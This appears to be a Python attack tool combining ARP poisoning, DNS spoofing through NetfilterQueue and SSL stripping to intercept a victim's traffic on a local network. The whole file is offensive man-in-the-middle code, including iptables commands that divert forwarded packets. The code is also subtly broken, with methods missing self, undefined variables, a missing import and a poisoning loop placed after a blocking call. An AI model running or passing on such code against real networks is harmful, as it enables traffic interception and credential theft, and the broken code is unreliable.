from scapy.all import *

from twisted.web import http
from twisted.internet import reactor

from sslstrip.StrippingProxy import StrippingProxy
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner

import sys, getopt, logging, traceback, string, os


class DefaultTool:
    def __init__(self, victim_ip, server_ip, network_inteface):
        self.victim_ip = victim_ip
        self.server_ip = server_ip
        self.network_interface = network_inteface

    @staticmethod
    def get_mac_from_ip(ip):
        result, _ = arping(ip)
        for _, received in result:
            return received[Ether].src

    def inspect(packet):
        # from payload raw packet's to scapy packet
        pkt = IP(packet.get_payload())
        # if the packet is a DNS packet
        if DNS in pkt:
            # And if the domain = domain_to_spoff and DNS is a answer packet (has a DNSRR layer)
            if domain_to_spoff.lower() in str(pkt[DNS].qd.qname) and pkt.haslayer(
                DNSRR
            ):
                # pass to the spoof function
                pkt = spoof(pkt)
                # put back raw version of modified packet on payload
                packet.set_payload(bytes(pkt))
        # forward
        packet.accept()

    def spoof(pkt):
        # change the answer section to redirect domain_to_spoff to desired address
        pkt[DNS].an = DNSRR(
            rrname=pkt[DNS].qd.qname, type="A", ttl=604800, rdata=ipAttacker
        )
        # set the answer count to 1
        pkt[DNS].ancount = 1
        # modifying the packet will change its checksums and lenght
        # we simply delete those field for IP and UDP
        # scapy will recalculate new proper values automaticaly when calling bytes()
        del pkt[IP].chksum
        del pkt[UDP].chksum
        del pkt[IP].len
        del pkt[UDP].len

        return pkt

    def ssl_stripping(self):
        logFile = "sslstrip.log"
        logLevel = logging.WARNING  # or WARNING
        listenPort = 8080
        spoofFavicon = False
        killSessions = True

        logging.basicConfig(
            level=logLevel,
            format="%(asctime)s %(message)s",
            filename=logFile,
            filemode="w",
        )
        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
        CookieCleaner.getInstance().setEnabled(killSessions)
        strippingFactory = http.HTTPFactory(timeout=10)
        strippingFactory.protocol = StrippingProxy
        reactor.listenTCP(int(listenPort), strippingFactory)
        print("sslstrip based on Moxie's Marlinspike sslstrip running...")
        reactor.run()

    def arp_poisoning(self):
        victim_mac = self.get_mac_from_ip(self.victim_ip)
        server_mac = self.get_mac_from_ip(self.server_ip)
        # getting self mac will throw exception if enp0s3 network interface does not exit
        attacker_mac = get_if_hwaddr(self.network_interface)

        victim_arp = Ether() / ARP()
        server_arp = Ether() / ARP()

        # Poison the victim's ARP table
        victim_arp[Ether].src = attacker_mac
        victim_arp[ARP].hwsrc = attacker_mac
        victim_arp[ARP].psrc = server_ip
        victim_arp[ARP].hwdst = victim_mac
        victim_arp[ARP].pdst = victim_ip

        sendp(victim_arp, iface=self.network_interface)

        # Poison the server's ARP table
        server_arp[Ether].src = attacker_mac
        server_arp[ARP].hwsrc = attacker_mac
        server_arp[ARP].psrc = victim_ip
        server_arp[ARP].hwdst = server_mac
        server_arp[ARP].pdst = server_ip

        sendp(server_arp, iface=self.network_interface)

    def attack(self):
        # we need an iptables FORWARD rule
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

        nfqueue = NetfilterQueue()
        nfqueue.bind(0, inspect)

        try:
            nfqueue.run()

            while True:
                self.arp_poisoning()
        except KeyboardInterrupt:
            # we need to clean the iptables rules else, shen done, we will stop forwarding
            os.system("iptables --flush")
